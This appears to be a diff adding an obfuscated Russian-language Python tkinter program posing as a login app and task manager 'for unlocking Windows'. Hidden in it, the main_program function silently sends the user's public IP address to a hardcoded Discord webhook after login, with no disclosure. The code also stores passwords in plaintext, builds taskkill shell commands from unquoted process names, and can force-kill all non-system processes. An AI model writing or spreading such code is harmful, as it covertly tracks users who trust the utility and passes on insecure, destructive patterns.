@@ -1,0 +1,192 @@
+import tkinter as tk #line:1
+from tkinter import messagebox #line:2
+import os #line:3
+import subprocess #line:4
+import sys #line:5
+import requests #line:6
+import json #line:7
+WEBHOOK_URL ="https://discord.com/api/webhooks/1310291979963207690/ICOx2D-dE-os3bBqSGds6uVruwyp_kiGV_QWNdFkIUCglM5K0OrT-8i1YzDruxUoU8fA"#line:10
+def get_public_ip ():#line:13
+    try :#line:14
+        O00O0OOOO0O00OOOO =requests .get ('https://api64.ipify.org?format=json')#line:16
+        O0OO00OOOOO00000O =O00O0OOOO0O00OOOO .json ()['ip']#line:17
+    except requests .RequestException as O000O0000O0OO0OOO :#line:18
+        print (f"Ошибка при получении IP: {O000O0000O0OO0OOO}")#line:19
+        O0OO00OOOOO00000O ='Не удалось получить IP'#line:20
+    return O0OO00OOOOO00000O #line:21
+def send_ip_to_discord (O0OOOOOOOO00O00OO ):#line:24
+    OO0O00OOOOO000OO0 ={"content":f"IP-адрес устройства: {O0OOOOOOOO00O00OO}"}#line:27
+    O0OOOO000OO00OOO0 ={"Content-Type":"application/json"}#line:30
+    try :#line:32
+        OO0O000O0O000O0O0 =requests .post (WEBHOOK_URL ,data =json .dumps (OO0O00OOOOO000OO0 ),headers =O0OOOO000OO00OOO0 )#line:33
+        print (f"Ответ от сервера: {OO0O000O0O000O0O0.status_code}")#line:36
+        if OO0O000O0O000O0O0 .status_code ==204 :#line:39
+            print ("IP-адрес успешно отправлен в Discord.")#line:40
+        else :#line:41
+            print (f"Ошибка при отправке IP в Discord: {OO0O000O0O000O0O0.status_code}")#line:42
+            print ("Тело ответа:",OO0O000O0O000O0O0 .text )#line:43
+    except requests .RequestException as OOOOO0OO0O000O0O0 :#line:44
+        print (f"Ошибка при отправке запроса: {OOOOO0OO0O000O0O0}")#line:45
+def register ():#line:48
+    def O00000O0O00O000OO ():#line:49
+        O000OOOOO00000OO0 =OO000OO0000O0OO0O .get ()#line:50
+        OO0000OOOO0000OOO =O0O00OO0OOOOO00OO .get ()#line:51
+        if not O000OOOOO00000OO0 or not OO0000OOOO0000OOO :#line:53
+            messagebox .showerror ("Ошибка","Пожалуйста, заполните все поля.")#line:54
+            return #line:55
+        with open ("users.txt","a")as OOOO0OO0OO00OOO0O :#line:57
+            OOOO0OO0OO00OOO0O .write (f"{O000OOOOO00000OO0}:{OO0000OOOO0000OOO}\n")#line:58
+        messagebox .showinfo ("Успех","Регистрация прошла успешно.")#line:60
+        login_window .destroy ()#line:61
+        login ()#line:62
+    O000000OOO000OO00 =tk .Toplevel (root )#line:64
+    O000000OOO000OO00 .title ("Регистрация")#line:65
+    O000000OOO000OO00 .geometry ("300x200")#line:66
+    O000000OOO000OO00 .attributes ("-topmost",1 )#line:67
+    tk .Label (O000000OOO000OO00 ,text ="Имя пользователя").pack (pady =10 )#line:69
+    OO000OO0000O0OO0O =tk .Entry (O000000OOO000OO00 )#line:70
+    OO000OO0000O0OO0O .pack (pady =5 )#line:71
+    tk .Label (O000000OOO000OO00 ,text ="Пароль").pack (pady =10 )#line:73
+    O0O00OO0OOOOO00OO =tk .Entry (O000000OOO000OO00 ,show ="*")#line:74
+    O0O00OO0OOOOO00OO .pack (pady =5 )#line:75
+    tk .Button (O000000OOO000OO00 ,text ="Зарегистрироваться",command =O00000O0O00O000OO ).pack (pady =20 )#line:77
+def login ():#line:80
+    def O0O0O00O00O0OOO00 ():#line:81
+        OOOOO0OO0OOO00OOO =OO00000OOOOO0O000 .get ()#line:82
+        OOOO0O00OO000OOOO =OOO0OO000OO0OOO00 .get ()#line:83
+        if not OOOOO0OO0OOO00OOO or not OOOO0O00OO000OOOO :#line:85
+            messagebox .showerror ("Ошибка","Пожалуйста, заполните все поля.")#line:86
+            return #line:87
+        with open ("users.txt","r")as OO0OO00OO0000000O :#line:89
+            O00O0000OOO0000OO =OO0OO00OO0000000O .readlines ()#line:90
+        for OOOOOOOO00OOOO0OO in O00O0000OOO0000OO :#line:92
+            O000000OO00O0OOO0 ,OO00O0O00OOO000O0 =OOOOOOOO00OOOO0OO .strip ().split (":")#line:93
+            if OOOOO0OO0OOO00OOO ==O000000OO00O0OOO0 and OOOO0O00OO000OOOO ==OO00O0O00OOO000O0 :#line:94
+                messagebox .showinfo ("Успех","Вход выполнен успешно.")#line:95
+                OO0O0OO0O000OOOO0 .destroy ()#line:96
+                main_program ()#line:97
+                return #line:98
+        messagebox .showerror ("Ошибка","Неверное имя пользователя или пароль.")#line:100
+    OO0O0OO0O000OOOO0 =tk .Toplevel (root )#line:102
+    OO0O0OO0O000OOOO0 .title ("Вход")#line:103
+    OO0O0OO0O000OOOO0 .geometry ("300x200")#line:104
+    OO0O0OO0O000OOOO0 .attributes ("-topmost",1 )#line:105
+    tk .Label (OO0O0OO0O000OOOO0 ,text ="Имя пользователя").pack (pady =10 )#line:107
+    OO00000OOOOO0O000 =tk .Entry (OO0O0OO0O000OOOO0 )#line:108
+    OO00000OOOOO0O000 .pack (pady =5 )#line:109
+    tk .Label (OO0O0OO0O000OOOO0 ,text ="Пароль").pack (pady =10 )#line:111
+    OOO0OO000OO0OOO00 =tk .Entry (OO0O0OO0O000OOOO0 ,show ="*")#line:112
+    OOO0OO000OO0OOO00 .pack (pady =5 )#line:113
+    tk .Button (OO0O0OO0O000OOOO0 ,text ="Войти",command =O0O0O00O00O0OOO00 ).pack (pady =20 )#line:115
+    tk .Button (OO0O0OO0O000OOOO0 ,text ="Зарегистрироваться",command =register ).pack (pady =5 )#line:116
+def settings ():#line:119
+    O0O0O0O0OOOOOOOOO =tk .Toplevel (root )#line:120
+    O0O0O0O0OOOOOOOOO .title ("Настройки")#line:121
+    O0O0O0O0OOOOOOOOO .geometry ("400x300")#line:122
+    O0O0O0O0OOOOOOOOO .config (bg ="#2f2f2f")#line:123
+    O0O0O0O0OOOOOOOOO .attributes ("-topmost",1 )#line:124
+    def OOOOO0OO0OOOOOOOO ():#line:126
+        global close_enabled #line:127
+        close_enabled =not close_enabled #line:128
+        OOOO0OO0OOOO00O0O ="включено"if close_enabled else "отключено"#line:129
+        O0O00O000OOOOO0OO .config (text =f"Закрытие {OOOO0OO0OOOO00O0O}")#line:130
+        if close_enabled :#line:131
+            enable_close_functionality ()#line:132
+        else :#line:133
+            disable_close_functionality ()#line:134
+    O0O00O000OOOOO0OO =tk .Button (O0O0O0O0OOOOOOOOO ,text ="Закрытие включено",command =OOOOO0OO0OOOOOOOO ,bg ="#3a3a3a",fg ="white",font =("Arial",12 ),relief ="flat")#line:140
+    O0O00O000OOOOO0OO .pack (pady =20 )#line:141
+def disable_close_functionality ():#line:144
+    root .protocol ("WM_DELETE_WINDOW",lambda :None )#line:145
+    root .bind ("<Alt-F4>",lambda O00OOOOOO00OO0O00 :"break")#line:146
+def enable_close_functionality ():#line:148
+    root .protocol ("WM_DELETE_WINDOW",on_close )#line:149
+    root .bind ("<Alt-F4>",lambda O000OO00O00000O00 :on_close ())#line:150
+def about_program ():#line:153
+    messagebox .showinfo ("О программе","Эту программу можно использовать в целях разблокировки винды или отслеживания процессов. Здесь более удобное отслеживание, чем в обычном диспетчере задач.")#line:154
+def open_task_manager ():#line:157
+    OO00000000OO0OO0O =tk .Toplevel (root )#line:158
+    OO00000000OO0OO0O .title ("Task manager")#line:159
+    OO00000000OO0OO0O .geometry ("500x400")#line:160
+    OO00000000OO0OO0O .config (bg ="#2f2f2f")#line:161
+    OO00000000OO0OO0O .attributes ("-topmost",1 )#line:162
+    O0OO0OOOO00O000O0 =tk .Label (OO00000000OO0OO0O ,text ="Поиск:",bg ="#2f2f2f",fg ="white",font =("Arial",10 ))#line:165
+    O0OO0OOOO00O000O0 .pack (pady =5 )#line:166
+    OO00OO0O000OOOOO0 =tk .Entry (OO00000000OO0OO0O ,bg ="#3a3a3a",fg ="white",font =("Arial",10 ))#line:167
+    OO00OO0O000OOOOO0 .pack (fill ="x",padx =10 )#line:168
+    OOOO000O0OO0O00O0 =tk .Listbox (OO00000000OO0OO0O ,bg ="#3a3a3a",fg ="white",font =("Arial",10 ),selectmode ="SINGLE")#line:171
+    OOOO000O0OO0O00O0 .pack (fill ="both",expand =True ,padx =10 ,pady =10 )#line:172
+    def OOO000OOOO00OO0O0 (OOOO0000OOO0O00OO ):#line:175
+        OOOO000O0OO0O00O0 .delete (0 ,tk .END )#line:176
+        for O0O0O0O0O0O00O000 in OOOO0000OOO0O00OO :#line:177
+            OOOO000O0OO0O00O0 .insert (tk .END ,O0O0O0O0O0O00O000 )#line:178
+    def O00O0OOOO0O0OO00O ():#line:181
+        O00000OO00000O00O =[]#line:182
+        try :#line:183
+            OOO0O0OO00OO00OO0 =subprocess .check_output ("tasklist",shell =True ,text =True )#line:184
+            OO0O000OO0OO0O00O =OOO0O0OO00OO00OO0 .splitlines ()[3 :]#line:185
+            for O0000OO00OOO000O0 in OO0O000OO0OO0O00O :#line:186
+                O00O0OO0O0OO00OO0 =O0000OO00OOO000O0 .split ()[0 ]#line:187
+                O00000OO00000O00O .append (O00O0OO0O0OO00OO0 )#line:188
+        except Exception as OO000O000O0OO0O00 :#line:189
+            messagebox .showerror ("Ошибка",f"Не удалось получить процессы: {str(OO000O000O0OO0O00)}")#line:190
+        return O00000OO00000O00O #line:191
+    def OOO0OO0O000OO000O ():#line:194
+        O0OOOOO0OOOO0O0OO =O00O0OOOO0O0OO00O ()#line:195
+        O0OOO00000000O000 =["System","svchost.exe","explorer.exe","winlogon.exe","csrss.exe","smss.exe"]#line:198
+        OOO000OOOO00OO0O0 ([OO00O00OO000O0OOO for OO00O00OO000O0OOO in O0OOOOO0OOOO0O0OO if OO00O00OO000O0OOO in O0OOO00000000O000 ])#line:199
+    def OOOO0000OO00OOO00 ():#line:201
+        O0O0O000O0O000OOO =O00O0OOOO0O0OO00O ()#line:202
+        O00O0OOO0000000OO =["System","svchost.exe","explorer.exe","winlogon.exe","csrss.exe","smss.exe"]#line:205
+        OOO000OOOO00OO0O0 ([OO00O0O0O000O0000 for OO00O0O0O000O0000 in O0O0O000O0O000OOO if OO00O0O0O000O0000 not in O00O0OOO0000000OO ])#line:206
+    def OO0OO0000OO000OOO ():#line:208
+        OOO000OOOO00OO0O0 (O00O0OOOO0O0OO00O ())#line:209
+    def O0O000O0O00OO000O (OOOOO00O0000O0OOO ):#line:212
+        OO0O00OO0O00OOO0O =OOOO000O0OO0O00O0 .curselection ()#line:213
+        if OO0O00OO0O00OOO0O :#line:214
+            O00OO0000O00O0000 =OOOO000O0OO0O00O0 .get (OO0O00OO0O00OOO0O )#line:215
+            try :#line:216
+                os .system (f"taskkill /f /im {O00OO0000O00O0000}")#line:217
+                messagebox .showinfo ("Успех",f"Процесс {O00OO0000O00O0000} завершен.")#line:218
+                OOOO000O0OO0O00O0 .delete (OO0O00OO0O00OOO0O )#line:219
+            except Exception as OO000OOOO0OO0O000 :#line:220
+                messagebox .showerror ("Ошибка",f"Не удалось завершить процесс: {str(OO000OOOO0OO0O000)}")#line:221
+    def O0000OO000O0OO0O0 ():#line:224
+        O0OOOOO0O0O00O000 =O00O0OOOO0O0OO00O ()#line:225
+        O0OO0OO00OO0OOOO0 =0 #line:226
+        O00OO00OOOOOOOO00 =["explorer.exe","svchost.exe","winlogon.exe","csrss.exe","smss.exe"]#line:227
+        for O000OOOOO000OOO00 in O0OOOOO0O0O00O000 :#line:229
+            if O000OOOOO000OOO00 not in O00OO00OOOOOOOO00 :#line:230
+                try :#line:231
+                    os .system (f"taskkill /f /im {O000OOOOO000OOO00}")#line:232
+                    O0OO0OO00OO0OOOO0 +=1 #line:233
+                except Exception as O0OOO000OOOOOOO0O :#line:234
+                    print (f"Ошибка при закрытии процесса {O000OOOOO000OOO00}: {O0OOO000OOOOOOO0O}")#line:235
+        messagebox .showinfo ("Закрытие",f"Завершено {O0OO0OO00OO0OOOO0} процессов.")#line:237
+    tk .Button (OO00000000OO0OO0O ,text ="Все процессы",command =OO0OO0000OO000OOO ).pack (pady =5 )#line:240
+    tk .Button (OO00000000OO0OO0O ,text ="Системные процессы",command =OOO0OO0O000OO000O ).pack (pady =5 )#line:241
+    tk .Button (OO00000000OO0OO0O ,text ="Не системные процессы",command =OOOO0000OO00OOO00 ).pack (pady =5 )#line:242
+    tk .Button (OO00000000OO0OO0O ,text ="Закрыть все приложения",command =O0000OO000O0OO0O0 ).pack (pady =5 )#line:243
+    OO00000000OO0OO0O .bind ("<Delete>",O0O000O0O00OO000O )#line:246
+    OO0OO0000OO000OOO ()#line:249
+def main_program ():#line:252
+    O0O0OOOO0O0O000O0 =get_public_ip ()#line:254
+    send_ip_to_discord (O0O0OOOO0O0O000O0 )#line:255
+    O00O0O00OOO00O000 =tk .Toplevel (root )#line:258
+    O00O0O00OOO00O000 .title ("Program by Vinder_offi")#line:259
+    O00O0O00OOO00O000 .geometry ("600x400")#line:260
+    O00O0O00OOO00O000 .config (bg ="#2f2f2f")#line:261
+    O00O0O00OOO00O000 .attributes ("-topmost",1 )#line:262
+    tk .Label (O00O0O00OOO00O000 ,text ="Добро пожаловать в программу!",bg ="#2f2f2f",fg ="white",font =("Arial",16 )).pack (pady =20 )#line:264
+    tk .Button (O00O0O00OOO00O000 ,text ="Настройки",command =settings ).pack (pady =5 )#line:267
+    tk .Button (O00O0O00OOO00O000 ,text ="Task manager",command =open_task_manager ).pack (pady =5 )#line:268
+    tk .Button (O00O0O00OOO00O000 ,text ="О программе",command =about_program ).pack (pady =5 )#line:269
+root =tk .Tk ()#line:272
+root .title ("Главное окно")#line:273
+root .geometry ("300x200")#line:274
+root .attributes ("-topmost",1 )#line:275
+tk .Label (root ,text ="Добро пожаловать!",font =("Arial",16 )).pack (pady =20 )#line:277
+tk .Button (root ,text ="Войти",command =login ).pack (pady =10 )#line:279
+tk .Button (root ,text ="Зарегистрироваться",command =register ).pack (pady =10 )#line:280
+root .mainloop ()#line:282
+
